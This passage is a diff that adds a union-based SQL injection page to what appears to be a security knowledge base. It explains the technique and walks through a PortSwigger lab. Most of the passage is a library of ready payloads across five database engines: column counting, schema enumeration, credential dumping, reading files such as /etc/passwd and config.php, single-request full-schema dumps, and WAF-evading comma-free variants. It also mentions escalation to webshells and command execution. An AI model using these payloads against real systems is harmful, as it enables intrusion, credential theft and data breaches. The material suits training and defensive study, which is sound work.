@@ -279,6 +279,7 @@ var PAGE_UPDATED = {
   'labs':                 {date: '2026-03-23', version: 'v0.1.0'},
   'sqli-classic-inband':  {date: '2026-03-24', version: 'v1.0.0'},
   'sqli-error-based':     {date: '2026-03-24', version: 'v1.0.0'},
+  'sqli-union-based':     {date: '2026-03-24', version: 'v1.0.0'},
   'sqli-blind-boolean':   {date: '2026-03-24', version: 'v1.0.0'}
 };
 
@@ -5196,6 +5197,2002 @@ related_pages:
 \`\`\`
 `;
 
+
+PAGES.sqli_union_based = `<p>
+<span style="background:#d32f2f;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CRITICAL</span>&nbsp;
+<span style="background:#f57c00;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CWE-89</span>&nbsp;
+<span style="background:#7b1fa2;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CAPEC-66</span>&nbsp;
+<span style="background:#d32f2f;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CVSS 9.8</span>&nbsp;
+<span style="background:#1565c0;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">OWASP A05:2025</span>
+</p>
+
+# Union-Based SQL Injection
+
+**CAT-01 > SQL Injection > Union-Based**
+
+---
+
+## Table of Contents
+
+1. [Overview](#overview)
+2. [Understanding From Zero](#understanding-from-zero)
+3. [Attack Surface Identification](#attack-surface-identification)
+4. [How It Works](#how-it-works)
+5. [Detection and Validation](#detection-and-validation)
+6. [Beginner Lab Walkthrough](#beginner-lab-walkthrough)
+7. [Techniques](#techniques)
+8. [Tactics (MITRE ATT&CK)](#tactics-mitre-attck)
+9. [Tools](#tools)
+10. [Payload Crafting](#payload-crafting)
+11. [Exploitation](#exploitation)
+12. [Post-Exploitation](#post-exploitation)
+13. [Detection Evasion](#detection-evasion)
+14. [Variations and Edge Cases](#variations-and-edge-cases)
+15. [Modern Stack Specifics](#modern-stack-specifics)
+16. [Real-World Examples](#real-world-examples)
+17. [Skill Progression Path](#skill-progression-path)
+18. [Defensive Countermeasures](#defensive-countermeasures)
+19. [References](#references)
+20. [AI Agent Metadata](#ai-agent-metadata)
+
+---
+
+## Overview
+
+Union-based SQL injection is a data exfiltration technique where the attacker appends a \`UNION SELECT\` clause to the application's original SQL query, fusing an attacker-controlled SELECT statement with the legitimate one so that the combined result set flows through the application's normal output channel. The SQL \`UNION\` operator merges the rows returned by two or more SELECT statements into a single result set. By injecting a second SELECT that targets arbitrary tables -- tables the application was never designed to expose -- the attacker forces the database to return those rows alongside the original query's data. The application then renders both sets of data through its normal display logic, completely unaware that the second set was never part of the intended query. The attacker reads secrets directly from the page output: credentials, tokens, PII, schema metadata, configuration values, or any other data accessible to the database user.
+
+The technique rests on one core requirement: the application must render query results back to the user. Unlike blind SQLi (where the attacker infers data from behavioral differences one bit at a time) or error-based SQLi (where data leaks through error messages), union-based extraction provides the full result set in a single response. This makes it the fastest in-band extraction method: an entire table can be dumped in a handful of requests using aggregation functions like \`GROUP_CONCAT()\`, \`STRING_AGG()\`, or \`LISTAGG()\`, compared to thousands of requests required by blind techniques. The speed advantage is measured in orders of magnitude -- a full user table that takes hours to extract via boolean-blind can be dumped in seconds via UNION.
+
+Two hard constraints govern UNION injection. First, the attacker's injected SELECT must return exactly the same number of columns as the original query. A column count mismatch produces an immediate database error: "All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists." The attacker determines the column count through \`ORDER BY\` probing or iterative \`UNION SELECT NULL\` payloads before crafting the final extraction query. Second, the data types in each column position must be compatible between the original and injected queries. NULL values are universally type-compatible across all databases, so the attacker uses NULL placeholders initially, then replaces specific positions with string markers to identify which columns accept text and render on the page.
+
+Once the column count and injectable text positions are known, the methodology proceeds through a deterministic sequence: fingerprint the database engine (MySQL, PostgreSQL, MSSQL, Oracle, SQLite), enumerate the schema via system catalog tables (\`information_schema\`, \`all_tables\`, \`sqlite_master\`), identify target tables and columns containing sensitive data, and extract the data through the UNION channel. Advanced operators use aggregation functions to collapse all rows into a single output value (the Dump In One Shot technique) and can escalate from data extraction to file system read/write to remote code execution depending on the database engine and privilege level.
+
+Union-based SQLi is classified under CWE-89 (Improper Neutralization of Special Elements used in an SQL Command) and mapped to CAPEC-66 (SQL Injection). OWASP classifies it under A03:2021 (Injection) and A05:2025 (Security Misconfiguration when verbose errors assist exploitation). CVSS base scores for exploitable union-based SQLi consistently reach 9.8 Critical when the injection is unauthenticated, as demonstrated by CVE-2024-2879 (LayerSlider, 9.8), CVE-2024-27956 (WP-Automatic, 9.8), CVE-2022-0739 (BookingPress, 9.8), and CVE-2022-28346 (Django, 9.8). Academic research from the Georgia Institute of Technology found that UNION-based extraction accounts for approximately 20-25% of all SQL injection vulnerabilities in studied datasets and is the primary technique used for data exfiltration as opposed to authentication bypass.
+
+---
+
+## Understanding From Zero
+
+### Analogy
+
+Imagine a corporate assistant who compiles a printed report every quarter. The boss asks for the Q3 sales figures, and the assistant queries the database, prints the results, staples the pages, and delivers the report. Now imagine an attacker slips an extra page into the stack before it reaches the boss -- a page listing every employee's salary, pulled from the payroll database. The boss reads through the entire report without realizing the extra page came from a completely different source. The report format is the same, the paper is the same, and nothing about the delivery mechanism flagged the addition.
+
+\`UNION SELECT\` works exactly the same way. The application runs its normal query and gets the Q3 sales rows. The attacker's injected \`UNION SELECT username, password FROM users\` adds rows from the users table. The database engine merges both result sets into one. The application renders all the rows through its standard template, never distinguishing between legitimate data and injected data. The attacker reads the extra rows directly from the page.
+
+### Vulnerable Code
+
+\`\`\`php
+// PHP: user input concatenated directly into query
+$category = $_GET['category'];
+$query = "SELECT name, description FROM products WHERE category = '" . $category . "'";
+$result = mysqli_query($conn, $query);
+while ($row = mysqli_fetch_assoc($result)) {
+    echo "<tr><td>" . $row['name'] . "</td><td>" . $row['description'] . "</td></tr>";
+}
+\`\`\`
+
+### What the Attacker Submits
+
+\`\`\`
+GET /products?category=' UNION SELECT username, password FROM users--
+\`\`\`
+
+### What the Database Executes
+
+\`\`\`sql
+SELECT name, description FROM products WHERE category = '' UNION SELECT username, password FROM users--'
+\`\`\`
+
+The original query returns zero products (empty category). The UNION SELECT returns every row from the \`users\` table. The application iterates over the combined result set and renders \`username\` in the "name" column and \`password\` in the "description" column. The attacker reads the credentials directly from the HTML table.
+
+### Why It Works
+
+The SQL \`UNION\` operator is a legitimate language feature designed to combine results from multiple SELECT statements. The database engine does not distinguish between a UNION written by a developer and one injected by an attacker -- it simply merges the result sets. As long as the column count matches and the data types are compatible, the UNION executes without error. The application code, which expects a result set of name/description pairs, receives a result set of username/password pairs and renders them identically.
+
+### Column Count Matching Requirement
+
+The UNION operator requires that both SELECT statements produce the same number of columns. If the original query selects 3 columns and the attacker injects \`UNION SELECT 1,2\`, the database returns an error. The attacker must first determine the column count, then pad their injection with the correct number of values.
+
+### Concrete Impacts
+
+| Impact | How Union-Based SQLi Achieves It |
+|--------|----------------------------------|
+| **Full database extraction** | UNION SELECT pulls credentials, PII, financial records, tokens -- entire tables per request with GROUP_CONCAT |
+| **Schema discovery** | Querying information_schema/all_tables/sqlite_master reveals all tables, columns, data types |
+| **Authentication bypass** | Extract admin password hashes, API keys, or session tokens; or inject fabricated credential rows |
+| **Remote code execution** | MySQL: UNION SELECT INTO OUTFILE writes webshells; MSSQL: chain to xp_cmdshell; PostgreSQL: COPY TO PROGRAM |
+| **File system read** | MySQL LOAD_FILE(), PostgreSQL pg_read_file(), Oracle HTTPURITYPE/UTL_FILE read server files |
+| **Privilege escalation** | Extract DB admin credentials, encryption keys, or tokens stored in the database |
+
+---
+
+## Attack Surface Identification
+
+### Where to Look
+
+Union-based SQLi requires that query results are reflected in the response. Target any parameter whose value flows into a SELECT query that renders data on the page.
+
+| Injection Point | Example | Priority |
+|-----------------|---------|----------|
+| **GET query parameters** | \`/products?category=electronics&sort=name\` | Highest -- most common, easiest to test |
+| **URL path segments** | \`/api/v1/users/123\` | High -- numeric IDs often unsanitized |
+| **POST body fields** | \`{"search": "term", "filter": "active"}\` | High -- especially JSON APIs |
+| **Cookie values** | \`Cookie: user_id=5; session_prefs=default\` | Medium -- less common but overlooked |
+| **HTTP headers** | \`X-Forwarded-For\`, \`Referer\`, \`User-Agent\` | Medium -- logged to DB and queried back |
+| **REST API filters** | \`/api/products?filter[category]=1&sort=price\` | High -- ORM filter passthrough |
+| **GraphQL variables** | \`{"variables": {"userId": "5"}}\` | Medium -- resolvers may use raw SQL |
+| **Hidden form fields** | \`<input type="hidden" name="product_id" value="42">\` | Medium |
+| **Multi-select parameters** | \`?tags=1,2,3\` used in \`WHERE id IN (...)\` | High -- comma-delimited injection |
+
+### Indicators the Application Is Vulnerable to UNION
+
+1. **Data tables or lists rendered from query results** -- product listings, search results, user directories, report tables
+2. **Numeric or string parameters that modify the displayed data** -- category filters, sort columns, search terms
+3. **Error messages mentioning SQL syntax** -- confirms injection point exists; test UNION next
+4. **Column count can be determined** -- ORDER BY N succeeds up to a point, then errors
+5. **NULL injection changes response** -- \`' UNION SELECT NULL,NULL--\` produces a different response than a syntax error
+
+### What Disqualifies UNION-Based (Use Another Technique Instead)
+
+- Application returns no visible data from the query (blind techniques needed)
+- Application displays only a boolean result (boolean-blind)
+- Application returns consistent response regardless of query results (time-based blind)
+- WAF aggressively blocks UNION keyword after all bypass attempts exhausted (stacked queries, error-based, or OOB)
+
+---
+
+## How It Works
+
+\`\`\`mermaid
+flowchart TD
+    A["<b>Phase 1: Detect</b><br/>Inject ' or \\" to confirm SQLi point"] --> B["<b>Phase 2: Count Columns</b><br/>ORDER BY N / UNION SELECT NULL,..."]
+    B --> C["<b>Phase 3: Find Text Columns</b><br/>Replace NULL with 'marker' per position"]
+    C --> D["<b>Phase 4: Fingerprint DB</b><br/>@@version / version() / BANNER"]
+    D --> E["<b>Phase 5: Enumerate Schema</b><br/>information_schema / all_tables / sqlite_master"]
+    E --> F["<b>Phase 6: Extract Data</b><br/>UNION SELECT col1,col2 FROM target"]
+    F --> G["<b>Phase 7: Escalate</b><br/>File read/write, RCE chains, DIOS"]
+
+    style A fill:#ef5350,color:#fff
+    style B fill:#ff7043,color:#fff
+    style C fill:#ffa726,color:#fff
+    style D fill:#66bb6a,color:#fff
+    style E fill:#42a5f5,color:#fff
+    style F fill:#7e57c2,color:#fff
+    style G fill:#d32f2f,color:#fff
+\`\`\`
+
+**Phase 1 -- Detect Injection Point.** Inject standard SQL metacharacters (\`'\`, \`"\`, \`;\`, \`--\`, \`#\`) into each parameter. Observe whether the response changes: an error message, different content, or altered behavior confirms that user input reaches a SQL query without sanitization.
+
+**Phase 2 -- Count Columns.** Two methods: (a) \`ORDER BY N\` -- increment N from 1 until the database errors with "column N out of range"; the last successful N is the column count. (b) \`UNION SELECT NULL,...\` -- add NULLs until the query succeeds; the number of NULLs that works is the column count. ORDER BY is faster (binary search possible), while UNION SELECT NULL gives immediate confirmation.
+
+**Phase 3 -- Find Text Columns.** Replace each NULL with a string literal (\`'a'\`) one position at a time. If the page renders the string, that column is injectable and visible. If a type conversion error appears, that column is numeric. Identify all text-compatible positions.
+
+**Phase 4 -- Fingerprint the Database.** Inject version-detection queries through a confirmed text column: \`@@version\` (MySQL/MSSQL), \`version()\` (PostgreSQL), \`BANNER FROM v$version\` (Oracle), \`sqlite_version()\` (SQLite). The version determines which system catalog tables and aggregation functions to use.
+
+**Phase 5 -- Enumerate Schema.** Query the system catalog to discover databases, tables, and columns. MySQL/PostgreSQL/MSSQL use \`information_schema\`. Oracle uses \`all_tables\` and \`all_tab_columns\`. SQLite uses \`sqlite_master\`. Use aggregation (GROUP_CONCAT, STRING_AGG, LISTAGG) to pull all names in a single request.
+
+**Phase 6 -- Extract Data.** Craft the final UNION SELECT targeting the discovered table and columns. Use aggregation to dump multiple rows in one request. Use LIMIT/OFFSET or ROWNUM for pagination when aggregation output is truncated.
+
+**Phase 7 -- Escalate.** Depending on database privileges: read files from the server filesystem, write webshells via INTO OUTFILE or COPY TO, execute OS commands via xp_cmdshell or COPY TO PROGRAM, or use DIOS to dump the entire schema in one shot.
+
+---
+
+## Detection and Validation
+
+### Quick Confirmation Test
+
+\`\`\`
+# Step 1: Confirm injection with a single quote
+/products?category=test'
+
+# Step 2: Fix the query to confirm control
+/products?category=test' AND '1'='1
+
+# Step 3: Try ORDER BY to count columns
+/products?category=test' ORDER BY 1--
+/products?category=test' ORDER BY 5--
+/products?category=test' ORDER BY 3--
+
+# Step 4: Confirm UNION works
+/products?category=test' UNION SELECT NULL,NULL,NULL--
+
+# Step 5: Identify text column
+/products?category=test' UNION SELECT 'INJECTED',NULL,NULL--
+\`\`\`
+
+### Observable Indicators
+
+| Signal | Meaning |
+|--------|---------|
+| Page renders "INJECTED" string | Column 1 is a visible text column -- UNION confirmed |
+| Page shows extra rows in a data table | UNION rows merged into output |
+| Response length changes significantly with NULL count | Column count matched; application processing UNION results |
+| Error: "number of expressions must match" | Column count wrong; adjust NULL count |
+| Error: "Conversion failed ... varchar to int" | Column is numeric; use NULL in that position, string elsewhere |
+| Content disappears entirely | UNION may have succeeded but application only shows first row; use impossible WHERE on original query |
+
+### Force Original Query to Return Nothing
+
+Suppress the application's real data so only injected rows appear:
+
+\`\`\`sql
+-- Numeric parameter: use impossible value
+-1 UNION SELECT username,password,NULL FROM users--
+99999 UNION SELECT username,password,NULL FROM users--
+
+-- String parameter: use impossible condition
+' AND 1=2 UNION SELECT username,password,NULL FROM users--
+\`\`\`
+
+---
+
+## Beginner Lab Walkthrough
+
+### PortSwigger Lab: SQL injection UNION attack, determining the number of columns returned by the query
+
+**Difficulty:** PRACTITIONER
+**URL:** \`https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns\`
+
+**Objective:** Determine the number of columns returned by the query and perform a UNION attack that returns an additional row containing null values.
+
+**Step 1: Identify the injection point.**
+
+Navigate to the lab application. Click on a product category (e.g., "Gifts"). Observe the URL:
+
+\`\`\`
+https://LAB-ID.web-security-academy.net/filter?category=Gifts
+\`\`\`
+
+The \`category\` parameter drives a SQL query that populates the product listing.
+
+**Step 2: Confirm injection.**
+
+Append a single quote to the parameter:
+
+\`\`\`
+/filter?category=Gifts'
+\`\`\`
+
+The application returns an error or blank page, confirming the input reaches a SQL query.
+
+**Step 3: Determine column count with ORDER BY.**
+
+Try progressively higher ORDER BY values:
+
+\`\`\`
+/filter?category=Gifts'+ORDER+BY+1--     (page loads normally)
+/filter?category=Gifts'+ORDER+BY+2--     (page loads normally)
+/filter?category=Gifts'+ORDER+BY+3--     (page loads normally)
+/filter?category=Gifts'+ORDER+BY+4--     (error -- column 4 does not exist)
+\`\`\`
+
+The query returns 3 columns.
+
+**Step 4: Confirm with UNION SELECT NULL.**
+
+\`\`\`
+/filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--
+\`\`\`
+
+The page loads without error and may show an additional empty row in the product listing. This confirms 3 columns and a working UNION injection.
+
+**Step 5: Solve the lab.**
+
+The lab requires a UNION attack returning null values. The payload from Step 4 solves it:
+
+\`\`\`
+'+UNION+SELECT+NULL,NULL,NULL--
+\`\`\`
+
+**What you learned:** The foundational technique for every UNION attack -- determining column count. This step is mandatory before any data extraction.
+
+---
+
+## Techniques
+
+### Level 0: Understanding the UNION Operator
+
+The SQL \`UNION\` operator combines two SELECT statements into one result set. Every database engine supports it with the same core constraint: both SELECTs must produce the same number of columns with compatible data types.
+
+\`\`\`sql
+-- Legitimate UNION query
+SELECT name, price FROM products WHERE category = 'electronics'
+UNION
+SELECT name, price FROM products WHERE category = 'clothing'
+\`\`\`
+
+Two variants exist:
+
+| Variant | Behavior | Use in Injection |
+|---------|----------|------------------|
+| \`UNION\` | Removes duplicate rows (implicit DISTINCT) | May silently drop injected rows matching existing data |
+| \`UNION ALL\` | Keeps all rows including duplicates | **Preferred for injection** -- no deduplication overhead, no risk of silent data loss |
+
+Always use \`UNION ALL SELECT\` unless a specific scenario requires \`UNION SELECT\`. OWASP explicitly notes: "The keyword ALL is necessary to get around queries that use the keyword DISTINCT."
+
+### Level 1: Column Count Determination
+
+**ORDER BY Method (all databases):**
+
+Inject \`ORDER BY N\` with incrementing N. The last successful value equals the column count. Binary search is possible for high column counts.
+
+\`\`\`sql
+-- [L1-01] Increment until error
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--   -- success: at least 3 columns
+' ORDER BY 4--   -- error: "ORDER BY position 4 is out of range" -> 3 columns
+\`\`\`
+
+**UNION SELECT NULL Method (all databases):**
+
+Add NULLs until the query succeeds. NULL is universally type-compatible.
+
+\`\`\`sql
+-- [L1-02] Increment NULLs until success
+' UNION SELECT NULL--                    -- error (not 1 column)
+' UNION SELECT NULL,NULL--               -- error (not 2 columns)
+' UNION SELECT NULL,NULL,NULL--          -- success -> 3 columns
+\`\`\`
+
+**Oracle requires FROM DUAL:**
+
+\`\`\`sql
+-- [L1-03] Oracle column count
+' UNION SELECT NULL FROM DUAL--
+' UNION SELECT NULL,NULL FROM DUAL--
+' UNION SELECT NULL,NULL,NULL FROM DUAL--
+\`\`\`
+
+**GROUP BY Method (alternative):**
+
+\`\`\`sql
+-- [L1-04] GROUP BY behaves identically to ORDER BY for column counting
+' GROUP BY 1--
+' GROUP BY 2--
+' GROUP BY 3--
+\`\`\`
+
+**MySQL LIMIT INTO Method:**
+
+\`\`\`sql
+-- [L1-05] MySQL-specific: error message reveals column count
+1' LIMIT 1,1 INTO @--+
+1' LIMIT 1,1 INTO @,@--+
+1' LIMIT 1,1 INTO @,@,@--+
+\`\`\`
+
+**MySQL Bulk ORDER BY (fast single-request test):**
+
+\`\`\`sql
+-- [L1-06] One request to find approximate range
+' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
+-- Remove from end until success
+\`\`\`
+
+**Text Column Identification:**
+
+\`\`\`sql
+-- [L1-07] Replace each NULL with a string marker
+' UNION SELECT 'a',NULL,NULL--    -- if 'a' renders: column 1 is text
+' UNION SELECT NULL,'a',NULL--    -- if 'a' renders: column 2 is text
+' UNION SELECT NULL,NULL,'a'--    -- type error: column 3 is numeric
+\`\`\`
+
+### Level 2: Schema Enumeration Across Databases
+
+Once the column count, text positions, and database engine are known, enumerate the schema using system catalog tables.
+
+**Database Fingerprinting:**
+
+\`\`\`sql
+-- [L2-01] MySQL / MSSQL
+' UNION SELECT @@version,NULL,NULL--
+
+-- [L2-02] PostgreSQL
+' UNION SELECT version(),NULL,NULL--
+
+-- [L2-03] Oracle
+' UNION SELECT banner,NULL,NULL FROM v$version WHERE ROWNUM=1--
+
+-- [L2-04] SQLite
+' UNION SELECT sqlite_version(),NULL,NULL--
+\`\`\`
+
+**MySQL Schema Enumeration:**
+
+\`\`\`sql
+-- [L2-05] List all databases
+' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata--
+
+-- [L2-06] List tables in current database
+' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
+
+-- [L2-07] List columns in a specific table
+' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'--
+
+-- [L2-08] Extract data
+' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL,NULL FROM users--
+\`\`\`
+
+**PostgreSQL Schema Enumeration:**
+
+\`\`\`sql
+-- [L2-09] List databases
+' UNION SELECT STRING_AGG(datname,','),NULL,NULL FROM pg_database--
+
+-- [L2-10] List tables
+' UNION SELECT STRING_AGG(table_name,','),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--
+
+-- [L2-11] List columns
+' UNION SELECT STRING_AGG(column_name,','),NULL,NULL FROM information_schema.columns WHERE table_name='users'--
+
+-- [L2-12] Extract data
+' UNION SELECT STRING_AGG(username||':'||password, E'\\n'),NULL,NULL FROM users--
+\`\`\`
+
+**MSSQL Schema Enumeration:**
+
+\`\`\`sql
+-- [L2-13] List databases
+' UNION SELECT STRING_AGG(name,','),NULL,NULL FROM master.sys.databases--
+
+-- [L2-14] List tables
+' UNION SELECT STRING_AGG(name,','),NULL,NULL FROM sysobjects WHERE xtype='U'--
+
+-- [L2-15] List columns
+' UNION SELECT STRING_AGG(name,','),NULL,NULL FROM syscolumns WHERE id=OBJECT_ID('users')--
+
+-- [L2-16] Extract data (FOR XML PATH for pre-2017)
+' UNION SELECT STUFF((SELECT ','+username+':'+password FROM users FOR XML PATH('')),1,1,''),NULL,NULL--
+\`\`\`
+
+**Oracle Schema Enumeration:**
+
+\`\`\`sql
+-- [L2-17] List tables
+' UNION SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),NULL,NULL FROM all_tables WHERE owner='TARGETSCHEMA'--
+
+-- [L2-18] List columns
+' UNION SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_name),NULL,NULL FROM all_tab_columns WHERE table_name='USERS'--
+
+-- [L2-19] Extract data
+' UNION SELECT username||':'||password,NULL,NULL FROM users WHERE ROWNUM=1--
+\`\`\`
+
+**SQLite Schema Enumeration:**
+
+\`\`\`sql
+-- [L2-20] List tables (from sqlite_master)
+' UNION SELECT group_concat(tbl_name),NULL,NULL FROM sqlite_master WHERE type='table'--
+
+-- [L2-21] Get table schema (reveals column names)
+' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE tbl_name='users'--
+
+-- [L2-22] Column names via PRAGMA
+' UNION SELECT group_concat(name),NULL,NULL FROM pragma_table_info('users')--
+
+-- [L2-23] Extract data
+' UNION SELECT group_concat(username||':'||password,char(10)),NULL,NULL FROM users--
+\`\`\`
+
+### Level 3: Multi-Value Aggregation and File Read
+
+**GROUP_CONCAT (MySQL) -- Collapse All Rows Into One:**
+
+\`\`\`sql
+-- [L3-01] All credentials in one response
+' UNION SELECT GROUP_CONCAT(username,0x7c,password SEPARATOR 0x0a),NULL FROM users--
+
+-- [L3-02] With hex separators (no quotes needed for WAF bypass)
+' UNION SELECT GROUP_CONCAT(0x7c,username,0x3a,password,0x7c),NULL FROM users--
+\`\`\`
+
+**STRING_AGG (PostgreSQL 9.0+, MSSQL 2017+):**
+
+\`\`\`sql
+-- [L3-03] PostgreSQL
+' UNION SELECT STRING_AGG(username||':'||password, E'\\n'),NULL FROM users--
+
+-- [L3-04] MSSQL 2017+
+' UNION SELECT STRING_AGG(username+':'+password,CHAR(10)),NULL FROM users--
+\`\`\`
+
+**LISTAGG (Oracle 11g R2+):**
+
+\`\`\`sql
+-- [L3-05] Oracle
+' UNION SELECT LISTAGG(username||':'||password,CHR(10)) WITHIN GROUP (ORDER BY username),NULL FROM users--
+\`\`\`
+
+**FOR XML PATH (MSSQL all versions):**
+
+\`\`\`sql
+-- [L3-06] Pre-2017 MSSQL aggregation
+' UNION SELECT STUFF((SELECT ','+username+':'+password FROM users FOR XML PATH('')),1,1,''),NULL--
+\`\`\`
+
+**File Read via UNION:**
+
+\`\`\`sql
+-- [L3-07] MySQL: read /etc/passwd
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
+
+-- [L3-08] MySQL: base64-encoded file content
+' UNION SELECT TO_BASE64(LOAD_FILE('/var/www/html/config.php')),NULL--
+
+-- [L3-09] PostgreSQL: pg_read_file (superuser)
+' UNION SELECT pg_read_file('/etc/passwd'),NULL--
+
+-- [L3-10] Oracle: HTTPURITYPE file read
+' UNION SELECT HTTPURITYPE('file:///etc/passwd').getclob(),NULL FROM DUAL--
+
+-- [L3-11] MSSQL: OPENROWSET bulk file read
+' UNION SELECT (SELECT x FROM OPENROWSET(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),NULL--
+\`\`\`
+
+### Level 4: Advanced Techniques
+
+#### DIOS -- Dump In One Shot
+
+DIOS extracts maximum data in a single HTTP request using aggregation functions to concatenate all databases, tables, columns, and data into one output field. The goal: the entire schema in one payload.
+
+**MySQL DIOS -- Full Schema Dump:**
+
+\`\`\`sql
+-- [L4-01] All tables and columns in current database
+' UNION SELECT 1,(SELECT GROUP_CONCAT(
+    CONCAT_WS('::',table_schema,table_name,column_name) SEPARATOR '<br>'
+  ) FROM information_schema.columns WHERE table_schema!=0x696E666F726D6174696F6E5F736368656D61),3--
+\`\`\`
+
+**MySQL DIOS -- SecurityIdiots Classic (Variable Accumulation, Bypasses GROUP_CONCAT 1024-byte Limit):**
+
+\`\`\`sql
+-- [L4-02] Phase 1: full schema dump via variable concatenation
+' UNION SELECT 1,(SELECT (@x) FROM (SELECT (@x:=0x00),(@NR:=0),(SELECT (0) FROM (information_schema.COLUMNS) WHERE (TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61) AND (0x00) IN (@x:=CONCAT(@x,LPAD(@NR:=@NR+1,2,0x30),0x3a20,TABLE_SCHEMA,0x2e,TABLE_NAME,0x2e,COLUMN_NAME,0x3c62723e))))x),3--
+
+-- [L4-03] Phase 2: data dump from specific table
+' UNION SELECT 1,(SELECT (@x) FROM (SELECT (@x:=0x00),(SELECT (0) FROM (users) WHERE (0x00) IN (@x:=CONCAT(@x,0x3c62723e,id,0x3a,username,0x3a,password))))x),3--
+\`\`\`
+
+**MySQL DIOS -- JSON Format (MySQL 5.7+):**
+
+\`\`\`sql
+-- [L4-04] JSON-formatted schema dump
+' UNION SELECT 1,(SELECT JSON_ARRAYAGG(
+    JSON_OBJECT('schema',table_schema,'table',table_name,'column',column_name)
+  ) FROM information_schema.columns WHERE table_schema=database()),3--
+\`\`\`
+
+**PostgreSQL DIOS:**
+
+\`\`\`sql
+-- [L4-05] Full schema via STRING_AGG
+' UNION SELECT NULL,(SELECT STRING_AGG(
+    table_schema||'.'||table_name||'.'||column_name, E'\\n'
+  ) FROM information_schema.columns WHERE table_schema NOT IN ('pg_catalog','information_schema')),NULL--
+\`\`\`
+
+**MSSQL DIOS -- FOR XML PATH:**
+
+\`\`\`sql
+-- [L4-06] Full schema via FOR XML PATH
+' UNION SELECT NULL,(SELECT STUFF((
+    SELECT CHAR(10)+TABLE_SCHEMA+'.'+TABLE_NAME+'.'+COLUMN_NAME
+    FROM INFORMATION_SCHEMA.COLUMNS
+    FOR XML PATH('')
+  ),1,1,'')),NULL--
+\`\`\`
+
+**Oracle DIOS -- LISTAGG:**
+
+\`\`\`sql
+-- [L4-07] Full schema via LISTAGG
+' UNION SELECT NULL,(SELECT LISTAGG(owner||'.'||table_name||'.'||column_name,CHR(10))
+   WITHIN GROUP(ORDER BY owner,table_name)
+   FROM all_tab_columns WHERE owner NOT IN ('SYS','SYSTEM','MDSYS','CTXSYS','XDB')),NULL FROM DUAL--
+\`\`\`
+
+**Oracle DIOS -- XMLAGG (No Length Limit, Works on Older Versions):**
+
+\`\`\`sql
+-- [L4-08] XMLAGG-based DIOS for large datasets
+' UNION SELECT NULL,(SELECT RTRIM(
+    XMLAGG(
+      XMLELEMENT(e,owner||'.'||table_name||'.'||column_name||CHR(10)).EXTRACT('//text()')
+    ).GetClobVal(),CHR(10)
+  ) FROM all_tab_columns WHERE owner NOT IN ('SYS','SYSTEM')),NULL FROM DUAL--
+\`\`\`
+
+**SQLite DIOS:**
+
+\`\`\`sql
+-- [L4-09] Full CREATE TABLE statements (reveals all columns)
+' UNION SELECT 1,(SELECT GROUP_CONCAT(sql,CHAR(10)||CHAR(10)) FROM sqlite_master WHERE type='table'),3--
+\`\`\`
+
+**DIOS Decision Matrix:**
+
+| Database | Primary Function | Alternative | Max Output | Pagination |
+|----------|-----------------|-------------|------------|------------|
+| MySQL | GROUP_CONCAT | Variable accumulation | 1024 bytes default (adjustable) | LIMIT/OFFSET |
+| PostgreSQL | STRING_AGG | ARRAY_TO_STRING+ARRAY_AGG | No hard limit | LIMIT/OFFSET |
+| MSSQL | FOR XML PATH | STRING_AGG (2017+) | 2GB (XML) | TOP/OFFSET-FETCH |
+| Oracle | LISTAGG | XMLAGG (CLOB, unlimited) | 4000 chars (LISTAGG) | ROWNUM/OFFSET-FETCH |
+| SQLite | GROUP_CONCAT | JSON_GROUP_ARRAY (3.38+) | 1M bytes default | LIMIT/OFFSET |
+
+#### Comma-Free UNION
+
+When commas are blocked by a WAF, use CROSS JOIN to construct multi-column SELECTs without any commas.
+
+\`\`\`sql
+-- [L4-10] Standard (blocked by WAF):
+' UNION SELECT 1,2,3--
+
+-- [L4-11] Comma-free via JOIN (2 columns):
+' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b--
+
+-- [L4-12] Comma-free via JOIN (3 columns):
+' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
+
+-- [L4-13] Comma-free with data extraction:
+' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())b JOIN (SELECT 3)c--
+
+-- [L4-14] Comma-free LIMIT (replace LIMIT 0,1):
+' UNION SELECT username FROM users LIMIT 1 OFFSET 0--
+
+-- [L4-15] Comma-free SUBSTRING (replace SUBSTRING(col,1,1)):
+SUBSTRING(col FROM 1 FOR 1)
+MID(col FROM 1 FOR 1)
+\`\`\`
+
+The JOIN technique generates each column as a separate subquery aliased to a letter, then UNION SELECT * across all of them. No commas appear in the payload.
+
+#### Column-Name-Free Extraction
+
+When \`information_schema\` is blocked or column names cannot be discovered, extract data by ordinal position.
+
+**MySQL -- Self-JOIN Error Method (Discovers Column Names):**
+
+\`\`\`sql
+-- [L4-16] Each error reveals the next column name
+' UNION SELECT * FROM (SELECT * FROM users JOIN users b)a--
+-- Error: "Duplicate column name 'id'"
+' UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a--
+-- Error: "Duplicate column name 'username'"
+' UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,username))a--
+-- Error: "Duplicate column name 'password'"
